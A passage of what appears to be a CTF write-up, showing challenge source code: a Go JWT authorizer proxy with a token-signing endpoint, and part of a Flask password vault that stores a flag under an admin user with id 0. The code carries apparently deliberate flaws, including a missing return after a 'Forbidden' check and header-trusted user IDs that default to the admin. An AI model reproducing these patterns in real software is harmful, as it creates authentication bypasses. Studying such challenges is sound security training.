</span></span><span style=display:flex><span>	<span style=color:#a6e22e>tokenString</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>TrimSpace</span>(<span style=color:#a6e22e>authHeader</span>[<span style=color:#ae81ff>7</span>:])
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>tokenString</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span> {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>ParseWithClaims</span>(<span style=color:#a6e22e>tokenString</span>, <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>AuthClaims</span>{}, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>token</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>Token</span>) (<span style=color:#66d9ef>interface</span>{}, <span style=color:#66d9ef>error</span>) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>ok</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>token</span>.<span style=color:#a6e22e>Method</span>.(<span style=color:#f92672>*</span><span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>SigningMethodHMAC</span>); !<span style=color:#a6e22e>ok</span> {
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>nil</span>, <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Errorf</span>(<span style=color:#e6db74>&#34;unexpected signing method: %v&#34;</span>, <span style=color:#a6e22e>token</span>.<span style=color:#a6e22e>Header</span>[<span style=color:#e6db74>&#34;alg&#34;</span>])
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> []byte(<span style=color:#a6e22e>SecretKey</span>), <span style=color:#66d9ef>nil</span>
</span></span><span style=display:flex><span>	})
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Printf</span>(<span style=color:#e6db74>&#34;failed to parse token: %v&#34;</span>, <span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>claims</span>, <span style=color:#a6e22e>ok</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>token</span>.<span style=color:#a6e22e>Claims</span>.(<span style=color:#f92672>*</span><span style=color:#a6e22e>AuthClaims</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> !<span style=color:#a6e22e>ok</span> <span style=color:#f92672>||</span> !<span style=color:#a6e22e>token</span>.<span style=color:#a6e22e>Valid</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Printf</span>(<span style=color:#e6db74>&#34;invalid token claims&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>claims</span>.<span style=color:#a6e22e>UID</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>authorizer</span> <span style=color:#f92672>:=</span> <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>httputil</span>.<span style=color:#a6e22e>ReverseProxy</span>{<span style=color:#a6e22e>Director</span>: <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>req</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>Scheme</span> = <span style=color:#e6db74>&#34;http&#34;</span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>Host</span> = <span style=color:#e6db74>&#34;127.0.0.1:5000&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>uid</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>GetUIDFromRequest</span>(<span style=color:#a6e22e>req</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Printf</span>(<span style=color:#e6db74>&#34;Request UID: %s, URL: %s&#34;</span>, <span style=color:#a6e22e>uid</span>, <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>String</span>())
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#e6db74>&#34;X-User&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#e6db74>&#34;X-Forwarded-For&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#e6db74>&#34;Cookie&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>uid</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Set</span>(<span style=color:#e6db74>&#34;X-User&#34;</span>, <span style=color:#e6db74>&#34;anonymous&#34;</span>)
</span></span><span style=display:flex><span>		} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Set</span>(<span style=color:#e6db74>&#34;X-User&#34;</span>, <span style=color:#a6e22e>uid</span>)
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>signRouter</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>mux</span>.<span style=color:#a6e22e>NewRouter</span>()
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>signRouter</span>.<span style=color:#a6e22e>HandleFunc</span>(<span style=color:#e6db74>&#34;/sign&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>w</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>ResponseWriter</span>, <span style=color:#a6e22e>r</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> !<span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>HasPrefix</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>RemoteAddr</span>, <span style=color:#e6db74>&#34;127.0.0.1:&#34;</span>) {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Error</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;Forbidden&#34;</span>, <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusForbidden</span>)
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>uid</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>Query</span>().<span style=color:#a6e22e>Get</span>(<span style=color:#e6db74>&#34;uid&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>SignToken</span>(<span style=color:#a6e22e>uid</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Printf</span>(<span style=color:#e6db74>&#34;Failed to sign token: %v&#34;</span>, <span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Error</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;Failed to generate token&#34;</span>, <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusInternalServerError</span>)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>Write</span>([]byte(<span style=color:#a6e22e>token</span>))
</span></span><span style=display:flex><span>	}).<span style=color:#a6e22e>Methods</span>(<span style=color:#e6db74>&#34;GET&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;Sign service is running at 127.0.0.1:4444&#34;</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>go</span> <span style=color:#66d9ef>func</span>() {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>ListenAndServe</span>(<span style=color:#e6db74>&#34;127.0.0.1:4444&#34;</span>, <span style=color:#a6e22e>signRouter</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Fatal</span>(<span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;Authorizer middleware service is running at :5555&#34;</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>ListenAndServe</span>(<span style=color:#e6db74>&#34;:5555&#34;</span>, <span style=color:#a6e22e>authorizer</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Fatal</span>(<span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>web服务 vault python app.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> secrets
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> datetime <span style=color:#f92672>import</span> datetime
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> functools <span style=color:#f92672>import</span> wraps
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.fernet <span style=color:#f92672>import</span> Fernet
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> (
</span></span><span style=display:flex><span>    Flask,
</span></span><span style=display:flex><span>    flash,
</span></span><span style=display:flex><span>    g,
</span></span><span style=display:flex><span>    jsonify,
</span></span><span style=display:flex><span>    make_response,
</span></span><span style=display:flex><span>    redirect,
</span></span><span style=display:flex><span>    render_template,
</span></span><span style=display:flex><span>    request,
</span></span><span style=display:flex><span>    url_for,
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask_sqlalchemy <span style=color:#f92672>import</span> SQLAlchemy
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sqlalchemy.exc <span style=color:#f92672>import</span> IntegrityError
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>db <span style=color:#f92672>=</span> SQLAlchemy()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span>(db<span style=color:#f92672>.</span>Model):
</span></span><span style=display:flex><span>    id <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>Integer, primary_key<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>String(<span style=color:#ae81ff>80</span>), unique<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, nullable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    password_hash <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>String(<span style=color:#ae81ff>128</span>), nullable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    salt <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>String(<span style=color:#ae81ff>64</span>), nullable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    created_at <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>DateTime, default<span style=color:#f92672>=</span>datetime<span style=color:#f92672>.</span>utcnow, nullable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    vault_entries <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>relationship(<span style=color:#e6db74>&#39;VaultEntry&#39;</span>, backref<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;user&#39;</span>, lazy<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, cascade<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;all, delete-orphan&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>VaultEntry</span>(db<span style=color:#f92672>.</span>Model):
</span></span><span style=display:flex><span>    id <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>Integer, primary_key<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>    user_id <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>Integer, db<span style=color:#f92672>.</span>ForeignKey(<span style=color:#e6db74>&#39;user.id&#39;</span>), nullable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    label <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>String(<span style=color:#ae81ff>120</span>), nullable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    login <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>String(<span style=color:#ae81ff>120</span>), nullable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    password_encrypted <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>Text, nullable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    notes <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>Text)
</span></span><span style=display:flex><span>    created_at <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>Column(db<span style=color:#f92672>.</span>DateTime, default<span style=color:#f92672>=</span>datetime<span style=color:#f92672>.</span>utcnow, nullable<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>hash_password</span>(password: str, salt: bytes) <span style=color:#f92672>-&gt;</span> str:
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> salt <span style=color:#f92672>+</span> password<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>50</span>):
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>sha256(data)<span style=color:#f92672>.</span>digest()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> base64<span style=color:#f92672>.</span>b64encode(data)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>verify_password</span>(password: str, salt_b64: str, digest: str) <span style=color:#f92672>-&gt;</span> bool:
</span></span><span style=display:flex><span>    salt <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(salt_b64<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> hash_password(password, salt) <span style=color:#f92672>==</span> digest
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>generate_salt</span>() <span style=color:#f92672>-&gt;</span> bytes:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> secrets<span style=color:#f92672>.</span>token_bytes(<span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create_app</span>() <span style=color:#f92672>-&gt;</span> Flask:
</span></span><span style=display:flex><span>    app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;SECRET_KEY&#39;</span>] <span style=color:#f92672>=</span> secrets<span style=color:#f92672>.</span>token_hex(<span style=color:#ae81ff>32</span>)
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;SQLALCHEMY_DATABASE_URI&#39;</span>] <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>getenv(<span style=color:#e6db74>&#39;DATABASE_URL&#39;</span>, <span style=color:#e6db74>&#39;sqlite:///vault.db&#39;</span>)
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;SIGN_SERVER&#39;</span>] <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>getenv(<span style=color:#e6db74>&#39;SIGN_SERVER&#39;</span>, <span style=color:#e6db74>&#39;http://127.0.0.1:4444/sign&#39;</span>)
</span></span><span style=display:flex><span>    fernet_key <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>getenv(<span style=color:#e6db74>&#39;FERNET_KEY&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> fernet_key:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>RuntimeError</span>(<span style=color:#e6db74>&#39;Missing FERNET_KEY environment variable. Generate one with `python -c &#34;from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())&#34;`.&#39;</span>)
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;FERNET_KEY&#39;</span>] <span style=color:#f92672>=</span> fernet_key
</span></span><span style=display:flex><span>    db<span style=color:#f92672>.</span>init_app(app)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    fernet <span style=color:#f92672>=</span> Fernet(app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;FERNET_KEY&#39;</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> app<span style=color:#f92672>.</span>app_context():
</span></span><span style=display:flex><span>        db<span style=color:#f92672>.</span>create_all()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>first():
</span></span><span style=display:flex><span>            salt <span style=color:#f92672>=</span> secrets<span style=color:#f92672>.</span>token_bytes(<span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>            password <span style=color:#f92672>=</span> secrets<span style=color:#f92672>.</span>token_bytes(<span style=color:#ae81ff>32</span>)<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span>            password_hash <span style=color:#f92672>=</span> hash_password(password, salt)
</span></span><span style=display:flex><span>            user <span style=color:#f92672>=</span> User(
</span></span><span style=display:flex><span>                id<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>                username<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span>,
</span></span><span style=display:flex><span>                password_hash<span style=color:#f92672>=</span>password_hash,
</span></span><span style=display:flex><span>                salt<span style=color:#f92672>=</span>base64<span style=color:#f92672>.</span>b64encode(salt)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>),
</span></span><span style=display:flex><span>            )
</span></span><span style=display:flex><span>            db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>add(user)
</span></span><span style=display:flex><span>            db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>commit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;/flag&#39;</span>)<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>            flagEntry <span style=color:#f92672>=</span> VaultEntry(
</span></span><span style=display:flex><span>                user_id<span style=color:#f92672>=</span>user<span style=color:#f92672>.</span>id,
</span></span><span style=display:flex><span>                label<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;flag&#39;</span>,
</span></span><span style=display:flex><span>                login<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;flag&#39;</span>,
</span></span><span style=display:flex><span>                password_encrypted<span style=color:#f92672>=</span>fernet<span style=color:#f92672>.</span>encrypt(flag<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>),
</span></span><span style=display:flex><span>                notes<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;This is the flag entry.&#39;</span>,
</span></span><span style=display:flex><span>            )
</span></span><span style=display:flex><span>            db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>add(flagEntry)
</span></span><span style=display:flex><span>            db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>commit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login_required</span>(view_func):
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>@wraps</span>(view_func)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>wrapped</span>(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs):
</span></span><span style=display:flex><span>            uid <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;X-User&#39;</span>, <span style=color:#e6db74>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>            print(uid)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> uid <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;anonymous&#39;</span>:
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;Please sign in first.&#39;</span>, <span style=color:#e6db74>&#39;warning&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                uid_int <span style=color:#f92672>=</span> int(uid)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> (<span style=color:#a6e22e>TypeError</span>, <span style=color:#a6e22e>ValueError</span>):
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;Invalid session. Please sign in again.&#39;</span>, <span style=color:#e6db74>&#39;warning&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>))
</span></span><span style=display:flex><span>            user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(id<span style=color:#f92672>=</span>uid_int)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> user:
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;User not found. Please sign in again.&#39;</span>, <span style=color:#e6db74>&#39;warning&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            g<span style=color:#f92672>.</span>current_user <span style=color:#f92672>=</span> user
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> view_func(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> wrapped
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>        uid <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;X-User&#39;</span>, <span style=color:#e6db74>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> uid <span style=color:#f92672>or</span> uid <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;anonymous&#39;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>))
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;dashboard&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/register&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>register</span>():
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
</span></span><span style=display:flex><span>            username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>            password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>            confirm_password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;confirm_password&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> username <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> password:
